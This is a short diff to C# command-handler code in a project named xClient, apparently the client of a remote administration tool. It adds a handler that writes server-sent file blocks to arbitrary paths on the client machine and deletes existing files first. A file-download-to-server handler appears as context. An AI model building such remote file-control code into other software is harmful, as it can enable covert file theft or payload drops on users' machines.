@@ -1,8 +1,9 @@
 ﻿using System;
 using System.IO;
 using System.Threading;
-using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
+using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
@@ -75,7 +76,6 @@ namespace xClient.Core.Commands
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                                 Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                 srcFile.LastError).Execute(client);
-                            //Thread.Sleep(200);
                         }
                         else
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
@@ -97,6 +97,15 @@ namespace xClient.Core.Commands
                 _canceledDownloads.Add(command.ID, "canceled");
                 new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
             }
+        }
+
+        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
+        {
+            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
+                NativeMethods.DeleteFile(command.RemotePath); // delete existing file
+
+            FileSplit destFile = new FileSplit(command.RemotePath);
+            destFile.AppendBlock(command.Block, command.CurrentBlock);
         }
 
         public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
